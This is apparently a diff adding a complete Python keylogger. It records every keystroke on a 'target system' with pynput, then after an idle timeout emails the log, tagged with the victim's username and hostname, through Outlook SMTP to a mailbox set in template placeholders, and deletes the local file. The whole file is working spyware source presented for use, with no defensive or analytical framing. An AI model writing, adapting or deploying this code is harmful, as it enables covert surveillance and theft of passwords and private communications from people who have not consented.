@@ -1,0 +1,96 @@
+#// - Captures keystrokes from the target system and delivers them to the designated Outlook mailbox.
+
+import os
+import socket
+import smtplib
+import platform
+import datetime
+import tempfile
+import threading
+from email import encoders
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from pynput.keyboard import Listener, Key
+from email.mime.multipart import MIMEMultipart
+
+CONSUMER_EMAIL = "${CONSUMER_EMAIL}"
+CONSUMER_PASSWORD = "${CONSUMER_PASSWORD}"
+IDLE_TIMEOUT = "${IDLE_TIMEOUT}"
+
+class Logger:
+    def __init__(self, email: str, password: str, idle_timeout: int) -> None:
+        self.__email: str = email
+        self.__password: str = password
+        self.__idle_timeout: int = idle_timeout
+        self.__output: str = ""
+        self.__timer = None
+
+    def _process_key(self, key: Key) -> None:
+        try:
+            if hasattr(key, 'char') and key.char is not None:
+                self.__output += key.char
+            else:
+                self.__output += f" [{str(key).replace('Key.', '')}] "
+
+        except AttributeError:
+            self.__output += " [Invalid_key] "
+
+        self._reset_timer()
+
+    def _reset_timer(self) -> None:
+        if self.__timer:
+            self.__timer.cancel()
+
+        self.__timer = threading.Timer(self.__idle_timeout, self._write_file)
+        self.__timer.start()
+
+    def _write_file(self) -> None:
+        if self.__output:
+            with tempfile.NamedTemporaryFile(delete=False, mode="w", suffix=".txt") as temp_file:
+                temp_file.write(self.__output)
+                temp_file.flush() 
+
+                self._send_email(temp_file.name)
+
+    def _send_email(self, file_path: str) -> None:
+        try:
+            msg = MIMEMultipart()
+            msg['From'] = self.__email
+            msg['To'] = self.__email
+            msg['Subject'] = f"Log from {os.getlogin()}@{platform.uname().node} at {datetime.datetime.now()}"
+            msg.attach(MIMEText("Attached is the latest keylog file.", "plain"))
+
+            with open(file_path, "rb") as attachment:
+                part = MIMEBase("application", "octet-stream")
+                part.set_payload(attachment.read())
+                encoders.encode_base64(part)
+                part.add_header(
+                    "Content-Disposition",
+                    f"attachment; filename={file_path.split('/')[-1]}",
+                )
+
+                msg.attach(part)
+
+            with smtplib.SMTP("smtp-mail.outlook.com", 587) as smtp_server:
+                smtp_server.starttls()
+                smtp_server.login(self.__email, self.__password)
+                smtp_server.sendmail(self.__email, self.__email, msg.as_string())
+
+            self.__output = ""  
+            os.remove(file_path)  
+            print(f"Log file sent to {self.__email}")
+        
+        except socket.gaierror:
+            pass
+
+        except Exception as e:
+            print(f"Failed to send email: {e}")
+
+    def start_listener(self) -> None:
+        listener = Listener(on_press=self._process_key)
+        listener.daemon = True 
+        listener.start()  
+        listener.join() 
+
+if __name__ == "__main__":
+    Logger(email=CONSUMER_EMAIL, password=CONSUMER_PASSWORD, idle_timeout=int(IDLE_TIMEOUT)).start_listener()
